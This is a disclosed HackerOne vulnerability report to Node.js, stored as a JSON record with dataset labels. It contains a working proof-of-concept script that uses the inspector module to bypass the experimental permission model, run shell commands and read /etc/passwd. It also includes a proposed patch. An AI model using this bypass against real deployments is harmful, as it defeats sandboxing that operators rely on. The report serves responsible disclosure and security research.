{
  "reported_to": "Node.js",
  "reported_by": "mattaustin ",
  "title": "Process-based permissions can be bypassed with the \"inspector\" module.  ",
  "content": "\nSummary:\nRestrictions made with with the --experimental-permission flag can by bypassed with the built-in inspector module.\nDescription:\nThe Worker class can take an argument (the kIsInternal Symbol) to create an \"internal worker\" which does not respect the process level restrictions.\nWe cant access this Symbol('kIsInternal'); directly, however the inspector module is not disabled when process level restrictions are in place. \"The node:inspector module provides an API for interacting with the V8 inspector.\"\nIf we attach inspector inside the Worker constructor before new WorkerImpl is created we can simply change the value of \"isInternal\".\nSteps To Reproduce:\nCreate the following bypass.js file:\nCode 1.47 KiB\n1const { Session } = require('node:inspector/promises');\n2\n3const session = new Session();\n4session.connect();\n5\n6(async ()=>{\n7\tawait session.post('Debugger.enable');\n8\tawait session.post('Runtime.enable');\n9\n10\tglobal.Worker = require('node:worker_threads').Worker;\n11\t\n12\tlet {result:{ objectId }} = await session.post('Runtime.evaluate', { expression: 'Worker' });\n13\tlet { internalProperties } = await session.post(\"Runtime.getProperties\", { objectId: objectId });\n14\tlet {value:{value:{ scriptId }}} = internalProperties.filter(prop => prop.name == '[[FunctionLocation]]')[0];\n15\tlet { scriptSource } = await session.post(\"Debugger.getScriptSource\", { scriptId });\n16\n17\t// find the line number where WorkerImpl is called. \n18\tconst lineNumber = scriptSource.substring(0, scriptSource.indexOf(\"new WorkerImpl\")).split('\\n').length;\n19\n20\t// WorkerImpl will bypass permission for internal modules. We can inject the local var \"isInternal = true\" with a conditional breakpoint.\n21\tawait session.post(\"Debugger.setBreakpointByUrl\", {\n22\t\tlineNumber: lineNumber,\n23\t\turl: \"node:internal/worker\",\n24\t\tcolumnNumber: 0,\n25\t\tcondition: \"((isInternal = true),false)\"\n26\t});\n27\n28\tnew Worker(`\n29\t\tconst child_process = require(\"node:child_process\");\n30\t\tconsole.log(child_process.execSync(\"ls -l\").toString());\n31\t\t\n32\t\tconsole.log(require(\"fs\").readFileSync(\"/etc/passwd\").toString())\n33\t`, {\n34\t\teval: true,\n35\t\texecArgv: [\n36\t\t\t\"--experimental-permission\",\n37\t\t\t\"--allow-fs-read=*\",\n38\t\t\t\"--allow-fs-write=*\",\n39\t\t\t\"--allow-child-process\",\n40\t\t\t\"--no-warnings\"\n41\t\t]\n42\t});\n43\n44})()\nRun the following command :\nCode 63 Bytes\n1node --experimental-permission --allow-fs-read=$(pwd) bypass.js\n\nIf the policies were not bypassed we would expect to see something like:\nCode 215 Bytes\n1node --experimental-permission --allow-fs-read=$(pwd) safe.js\n2node:internal/child_process:1103\n3  const result = spawn_sync.spawn(options);\n4                            ^\n5\n6Error: Access to this API has been restricted\nSupporting Material/References:\nIn my opinion inspector should be allowed when process level permissions are being enforced.\nI noticed there was already a flag: EnvironmentFlags::kNoCreateInspector. I took a shot at patching this out unless ==inspect or --inspect-brk were used, but I didn't know if a more direct options like \"--allow-inspector\" would be preferred.\nCode 743 Bytes\ndiff --git a/src/env.cc b/src/env.cc\nindex 571a8ed5ce..b5b7557bd1 100644\n--- a/src/env.cc\n+++ b/src/env.cc\n@@ -791,6 +791,11 @@ Environment::Environment(IsolateData* isolate_data,\n   // spawn/worker nor use addons unless explicitly allowed by the user\n   if (!options_->allow_fs_read.empty() || !options_->allow_fs_write.empty()) {\n     options_->allow_native_addons = false;\n+      DebugOptions debug_options;\n+      debug_options = options_->debug_options();\n+      if (!debug_options.inspector_enabled || !debug_options.break_first_line) {\n+        flags_ = flags_ | EnvironmentFlags::kNoCreateInspector;\n+      }\n     if (!options_->allow_child_process) {\n       permission()->Apply(\"*\", permission::PermissionScope::kChildProcess);\n     }\nImpact\nPermission Model is a mechanism for restricting access to specific resources during execution. This bypasses those restrictions.\n\n",
  "severity": [
    7.7,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Improper Access Control - Generic"
  ],
  "screenshots": {},
  "disclosed_date": 1689901080,
  "report_url": "https://hackerone.com/reports/1962701",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a bypass.js file with the provided code that uses the node:inspector module to manipulate the Worker constructor."
    ],
    [
      2,
      "Run the bypass.js script with Node.js using the --experimental-permission flag to demonstrate the bypass of process-based permissions."
    ]
  ],
  "vuln_description": "The vulnerability allows bypassing Node.js process-based permissions by using the inspector module to manipulate the Worker constructor, enabling execution of restricted operations like file system access and child process execution.",
  "reason": "This vulnerability involves understanding and manipulating internal Node.js symbols and the inspector module's capabilities, which is non-trivial and requires deep knowledge of Node.js internals.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null,
  "idor_detectable": false,
  "authnz_byppass_detectable": false,
  "is_simple_payload": false,
  "injection_metadata": {
    "is_simple_payload": true
  },
  "authnz_metadata": {
    "idor_detectable": false,
    "authnz_byppass_detectable": false
  }
}